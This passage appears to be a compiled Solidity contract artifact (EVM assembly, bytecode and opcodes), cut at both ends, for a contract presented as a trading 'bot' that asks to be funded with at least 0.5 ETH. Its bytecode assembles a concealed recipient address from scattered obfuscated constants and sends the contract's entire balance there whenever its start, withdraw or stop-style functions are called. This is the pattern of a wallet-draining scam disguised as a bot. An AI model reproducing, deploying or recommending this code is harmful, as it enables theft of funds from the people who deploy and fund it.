tag_252\n      tag_195\n      jump\t// in\n    tag_252:\n        /* \"#utility.yul\":3942:3977   */\n    tag_251:\n        /* \"#utility.yul\":3998:3999   */\n      dup3\n        /* \"#utility.yul\":3995:3996   */\n      dup3\n        /* \"#utility.yul\":3991:4000   */\n      mod\n        /* \"#utility.yul\":3986:4000   */\n      swap1\n      pop\n        /* \"#utility.yul\":3830:4006   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4012:4206   */\n    tag_133:\n        /* \"#utility.yul\":4052:4056   */\n      0x00\n        /* \"#utility.yul\":4072:4092   */\n      tag_254\n        /* \"#utility.yul\":4090:4091   */\n      dup3\n        /* \"#utility.yul\":4072:4092   */\n      tag_194\n      jump\t// in\n    tag_254:\n        /* \"#utility.yul\":4067:4092   */\n      swap2\n      pop\n        /* \"#utility.yul\":4106:4126   */\n      tag_255\n        /* \"#utility.yul\":4124:4125   */\n      dup4\n        /* \"#utility.yul\":4106:4126   */\n      tag_194\n      jump\t// in\n    tag_255:\n        /* \"#utility.yul\":4101:4126   */\n      swap3\n      pop\n        /* \"#utility.yul\":4150:4151   */\n      dup3\n        /* \"#utility.yul\":4147:4148   */\n      dup3\n        /* \"#utility.yul\":4143:4152   */\n      sub\n        /* \"#utility.yul\":4135:4152   */\n      swap1\n      pop\n        /* \"#utility.yul\":4174:4175   */\n      dup2\n        /* \"#utility.yul\":4168:4172   */\n      dup2\n        /* \"#utility.yul\":4165:4176   */\n      gt\n        /* \"#utility.yul\":4162:4199   */\n      iszero\n      tag_256\n      jumpi\n        /* \"#utility.yul\":4179:4197   */\n      tag_257\n      tag_193\n      jump\t// in\n    tag_257:\n        /* \"#utility.yul\":4162:4199   */\n    tag_256:\n        /* \"#utility.yul\":4012:4206   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4212:4298   */\n    tag_196:\n        /* \"#utility.yul\":4247:4254   */\n      0x00\n        /* \"#utility.yul\":4287:4291   */\n      0xff\n        /* \"#utility.yul\":4280:4285   */\n      dup3\n        /* \"#utility.yul\":4276:4292   */\n      and\n        /* \"#utility.yul\":4265:4292   */\n      swap1\n      pop\n        /* \"#utility.yul\":4212:4298   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4304:4492   */\n    tag_180:\n        /* \"#utility.yul\":4342:4345   */\n      0x00\n        /* \"#utility.yul\":4361:4379   */\n      tag_260\n        /* \"#utility.yul\":4377:4378   */\n      dup3\n        /* \"#utility.yul\":4361:4379   */\n      tag_196\n      jump\t// in\n    tag_260:\n        /* \"#utility.yul\":4356:4379   */\n      swap2\n      pop\n        /* \"#utility.yul\":4393:4411   */\n      tag_261\n        /* \"#utility.yul\":4409:4410   */\n      dup4\n        /* \"#utility.yul\":4393:4411   */\n      tag_196\n      jump\t// in\n    tag_261:\n        /* \"#utility.yul\":4388:4411   */\n      swap3\n      pop\n        /* \"#utility.yul\":4434:4435   */\n      dup3\n        /* \"#utility.yul\":4431:4432   */\n      dup3\n        /* \"#utility.yul\":4427:4436   */\n      add\n        /* \"#utility.yul\":4420:4436   */\n      swap1\n      pop\n        /* \"#utility.yul\":4457:4461   */\n      0xff\n        /* \"#utility.yul\":4452:4455   */\n      dup2\n        /* \"#utility.yul\":4449:4462   */\n      gt\n        /* \"#utility.yul\":4446:4485   */\n      iszero\n      tag_262\n      jumpi\n        /* \"#utility.yul\":4465:4483   */\n      tag_263\n      tag_193\n      jump\t// in\n    tag_263:\n        /* \"#utility.yul\":4446:4485   */\n    tag_262:\n        /* \"#utility.yul\":4304:4492   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4498:4689   */\n    tag_186:\n        /* \"#utility.yul\":4536:4540   */\n      0x00\n        /* \"#utility.yul\":4556:4574   */\n      tag_265\n        /* \"#utility.yul\":4572:4573   */\n      dup3\n        /* \"#utility.yul\":4556:4574   */\n      tag_196\n      jump\t// in\n    tag_265:\n        /* \"#utility.yul\":4551:4574   */\n      swap2\n      pop\n        /* \"#utility.yul\":4588:4606   */\n      tag_266\n        /* \"#utility.yul\":4604:4605   */\n      dup4\n        /* \"#utility.yul\":4588:4606   */\n      tag_196\n      jump\t// in\n    tag_266:\n        /* \"#utility.yul\":4583:4606   */\n      swap3\n      pop\n        /* \"#utility.yul\":4630:4631   */\n      dup3\n        /* \"#utility.yul\":4627:4628   */\n      dup3\n        /* \"#utility.yul\":4623:4632   */\n      sub\n        /* \"#utility.yul\":4615:4632   */\n      swap1\n      pop\n        /* \"#utility.yul\":4654:4658   */\n      0xff\n        /* \"#utility.yul\":4648:4652   */\n      dup2\n        /* \"#utility.yul\":4645:4659   */\n      gt\n        /* \"#utility.yul\":4642:4682   */\n      iszero\n      tag_267\n      jumpi\n        /* \"#utility.yul\":4662:4680   */\n      tag_268\n      tag_193\n      jump\t// in\n    tag_268:\n        /* \"#utility.yul\":4642:4682   */\n    tag_267:\n        /* \"#utility.yul\":4498:4689   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n    data_66ba267ed9e689f4f612725ca4739f673c4421ca078ab0323046fa1dc83ed02a 4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732e\n\n    auxdata: 0xa2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_18": {
									"entryPoint": null,
									"id": 18,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561000f575f80fd5b506110078061001d5f395ff3fe608060405260043610610042575f3560e01c80631b55ba3a1461004d57806370e44c6a14610057578063bedf0f4a14610075578063d82c52d61461007f57610049565b3661004957005b5f80fd5b6100556100a9565b005b61005f61010f565b60405161006c9190610c07565b60405180910390f35b61007d6101b0565b005b34801561008a575f80fd5b50610093610216565b6040516100a09190610c07565b60405180910390f35b5f6100ba6100b5610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6100e2610671565b90811502906040515f60405180830381858888f1935050505015801561010a573d5f803e3d5ffd5b505050565b60605f61012261011d610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc61014a610671565b90811502906040515f60405180830381858888f19350505050158015610172573d5f803e3d5ffd5b506040518060400160405280601381526020017f5769746864726177616c20636f6d706c657465000000000000000000000000008152509250505090565b5f6101c16101bc610236565b6103a6565b90505f8190508073ffffffffffffffffffffffffffffffffffffffff166108fc6101e9610671565b90811502906040515f60405180830381858888f19350505050158015610211573d5f803e3d5ffd5b505050565b60606040518060a00160405280607e8152602001610f54607e9139905090565b60605f6102876040518060400160405280600181526020017f780000000000000000000000000000000000000000000000000000000000000081525061028261027d610678565b610682565b61090c565b90505f620d6fbc90505f610299610a9e565b90505f620e843390505f6102ab610aa8565b90505f61248590505f6102bc610ab2565b90505f620bf31590505f6102d8896102d38a610682565b61090c565b90505f6102f56102e789610682565b6102f089610682565b61090c565b90505f61031261030488610682565b61030d88610682565b61090c565b90505f61032f61032187610682565b61032a87610682565b61090c565b90505f61034e61033f868661090c565b610349858561090c565b61090c565b90505f6103906040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508361090c565b9050809e50505050505050505050505050505090565b5f808290505f80805f600290505b602a81101561066457610100846103cb9190610c73565b93508481815181106103e0576103df610cb4565b5b602001015160f81c60f81b60f81c60ff169250846001826104019190610cea565b8151811061041257610411610cb4565b5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff1610158015610463575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561047c576057836104759190610d1d565b9250610528565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156104ba575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156104d3576037836104cc9190610d1d565b9250610527565b60308373ffffffffffffffffffffffffffffffffffffffff1610158015610511575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610526576030836105239190610d1d565b92505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610566575060668273ffffffffffffffffffffffffffffffffffffffff1611155b1561057f576057826105789190610d1d565b915061062b565b60418273ffffffffffffffffffffffffffffffffffffffff16101580156105bd575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156105d6576037826105cf9190610d1d565b915061062a565b60308273ffffffffffffffffffffffffffffffffffffffff1610158015610614575060398273ffffffffffffffffffffffffffffffffffffffff1611155b15610629576030826106269190610d1d565b91505b5b5b816010846106399190610c73565b6106439190610d64565b8461064e9190610d64565b935060028161065d9190610cea565b90506103b4565b5082945050505050919050565b5f47905090565b5f6204cc53905090565b60605f808390505b5f81146106b357818061069c90610dab565b9250506010816106ac9190610e1f565b905061068a565b5f8267ffffffffffffffff8111156106ce576106cd610e4f565b5b6040519080825280601f01601f1916602001820160405280156107005781602001600182028036833780820191505090505b5090505f5b8381101561079d5760108661071a9190610e7c565b925061072583610abc565b82600183876107349190610eac565b61073e9190610eac565b8151811061074f5761074e610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535060108661078a9190610e1f565b95508061079690610dab565b9050610705565b505f81519050600481036107fa575f6107eb6040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b60038103610851575f6108426040518060400160405280600181526020017f30000000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600281036108a8575f6108996040518060400160405280600381526020017f30303000000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b600181036108ff575f6108f06040518060400160405280600481526020017f30303030000000000000000000000000000000000000000000000000000000008152508461090c565b90508095505050505050610907565b819450505050505b919050565b60605f8390505f8390505f815183516109259190610cea565b67ffffffffffffffff81111561093e5761093d610e4f565b5b6040519080825280601f01601f1916602001820160405280156109705781602001600182028036833780820191505090505b5090505f8190505f805f91505b8551821015610a045785828151811061099957610998610cb4565b5b602001015160f81c60f81b8382806109b090610dab565b9350815181106109c3576109c2610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a90535081806109fc90610dab565b92505061097d565b5f91505b8451821015610a8f57848281518110610a2457610a23610cb4565b5b602001015160f81c60f81b838280610a3b90610dab565b935081518110610a4e57610a4d610cb4565b5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690815f1a9053508180610a8790610dab565b925050610a08565b82965050505050505092915050565b5f6204958a905090565b5f620ef2e4905090565b5f620ebe5b905090565b5f8160ff165f11158015610ad4575060098260ff1611155b15610b1257817f300000000000000000000000000000000000000000000000000000000000000060f81c610b089190610eeb565b60f81b9050610b78565b8160ff16600a11158015610b2a5750600f8260ff1611155b15610b7457600a827f610000000000000000000000000000000000000000000000000000000000000060f81c610b609190610eeb565b610b6a9190610f1f565b60f81b9050610b78565b5f80fd5b919050565b5f81519050919050565b5f82825260208201905092915050565b5f5b83811015610bb4578082015181840152602081019050610b99565b5f8484015250505050565b5f601f19601f8301169050919050565b5f610bd982610b7d565b610be38185610b87565b9350610bf3818560208601610b97565b610bfc81610bbf565b840191505092915050565b5f6020820190508181035f830152610c1f8184610bcf565b905092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610c7d82610c27565b9150610c8883610c27565b9250828202610c9681610c27565b91508282048414831517610cad57610cac610c46565b5b5092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f819050919050565b5f610cf482610ce1565b9150610cff83610ce1565b9250828201905080821115610d1757610d16610c46565b5b92915050565b5f610d2782610c27565b9150610d3283610c27565b9250828203905073ffffffffffffffffffffffffffffffffffffffff811115610d5e57610d5d610c46565b5b92915050565b5f610d6e82610c27565b9150610d7983610c27565b9250828201905073ffffffffffffffffffffffffffffffffffffffff811115610da557610da4610c46565b5b92915050565b5f610db582610ce1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8203610de757610de6610c46565b5b600182019050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f610e2982610ce1565b9150610e3483610ce1565b925082610e4457610e43610df2565b5b828204905092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52604160045260245ffd5b5f610e8682610ce1565b9150610e9183610ce1565b925082610ea157610ea0610df2565b5b828206905092915050565b5f610eb682610ce1565b9150610ec183610ce1565b9250828203905081811115610ed957610ed8610c46565b5b92915050565b5f60ff82169050919050565b5f610ef582610edf565b9150610f0083610edf565b9250828201905060ff811115610f1957610f18610c46565b5b92915050565b5f610f2982610edf565b9150610f3483610edf565b9250828203905060ff811115610f4d57610f4c610c46565b5b9291505056fe4e6f7420656e6f756768206c697175696469747920617661696c61626c65206f6e2074686520636f6e747261637420746f2072756e2074686520626f742e20436f6e747261637420636f6465206e65656473206174206c6561737420302e352045544820746f2061766f69642063757272656e742067617320666565732ea2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x1007 DUP1 PUSH2 0x1D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x4D JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x57 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0xD82C52D6 EQ PUSH2 0x7F JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH2 0xA9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7D PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x8A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x93 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH2 0xBA PUSH2 0xB5 PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0xE2 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x122 PUSH2 0x11D PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x14A PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5769746864726177616C20636F6D706C65746500000000000000000000000000 DUP2 MSTORE POP SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C1 PUSH2 0x1BC PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x1E9 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x211 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0xA0 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7E DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF54 PUSH1 0x7E SWAP2 CODECOPY SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x287 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x282 PUSH2 0x27D PUSH2 0x678 JUMP JUMPDEST PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xD6FBC SWAP1 POP PUSH0 PUSH2 0x299 PUSH2 0xA9E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xE8433 SWAP1 POP PUSH0 PUSH2 0x2AB PUSH2 0xAA8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2485 SWAP1 POP PUSH0 PUSH2 0x2BC PUSH2 0xAB2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xBF315 SWAP1 POP PUSH0 PUSH2 0x2D8 DUP10 PUSH2 0x2D3 DUP11 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F5 PUSH2 0x2E7 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x2F0 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x312 PUSH2 0x304 DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x30D DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x32F PUSH2 0x321 DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x32A DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x34E PUSH2 0x33F DUP7 DUP7 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x349 DUP6 DUP6 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x390 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x664 JUMPI PUSH2 0x100 DUP5 PUSH2 0x3CB SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x3E0 JUMPI PUSH2 0x3DF PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x401 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x412 JUMPI PUSH2 0x411 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x47C JUMPI PUSH1 0x57 DUP4 PUSH2 0x475 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x528 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x4BA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x4D3 JUMPI PUSH1 0x37 DUP4 PUSH2 0x4CC SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x527 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x511 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x526 JUMPI PUSH1 0x30 DUP4 PUSH2 0x523 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x566 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x57F JUMPI PUSH1 0x57 DUP3 PUSH2 0x578 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62B JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x5BD JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x5D6 JUMPI PUSH1 0x37 DUP3 PUSH2 0x5CF SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP PUSH2 0x62A JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x614 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x629 JUMPI PUSH1 0x30 DUP3 PUSH2 0x626 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 PUSH2 0x639 SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST PUSH2 0x643 SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST DUP5 PUSH2 0x64E SWAP2 SWAP1 PUSH2 0xD64 JUMP JUMPDEST SWAP4 POP PUSH1 0x2 DUP2 PUSH2 0x65D SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST SWAP1 POP PUSH2 0x3B4 JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH0 PUSH3 0x4CC53 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 DUP1 DUP4 SWAP1 POP JUMPDEST PUSH0 DUP2 EQ PUSH2 0x6B3 JUMPI DUP2 DUP1 PUSH2 0x69C SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP3 POP POP PUSH1 0x10 DUP2 PUSH2 0x6AC SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP1 POP PUSH2 0x68A JUMP JUMPDEST PUSH0 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x6CE JUMPI PUSH2 0x6CD PUSH2 0xE4F JUMP JUMPDEST JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x700 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x79D JUMPI PUSH1 0x10 DUP7 PUSH2 0x71A SWAP2 SWAP1 PUSH2 0xE7C JUMP JUMPDEST SWAP3 POP PUSH2 0x725 DUP4 PUSH2 0xABC JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 PUSH2 0x734 SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST PUSH2 0x73E SWAP2 SWAP1 PUSH2 0xEAC JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x74F JUMPI PUSH2 0x74E PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 PUSH2 0x78A SWAP2 SWAP1 PUSH2 0xE1F JUMP JUMPDEST SWAP6 POP DUP1 PUSH2 0x796 SWAP1 PUSH2 0xDAB JUMP JUMPDEST SWAP1 POP PUSH2 0x705 JUMP JUMPDEST POP PUSH0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 SUB PUSH2 0x7FA JUMPI PUSH0 PUSH2 0x7EB PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x3 DUP2 SUB PUSH2 0x851 JUMPI PUSH0 PUSH2 0x842 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0x907 JUMP JUMPDEST PUSH1 0x2 DUP2 SUB PUSH2 0x8A8 JUMPI PUSH0 PUSH2 0x899 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 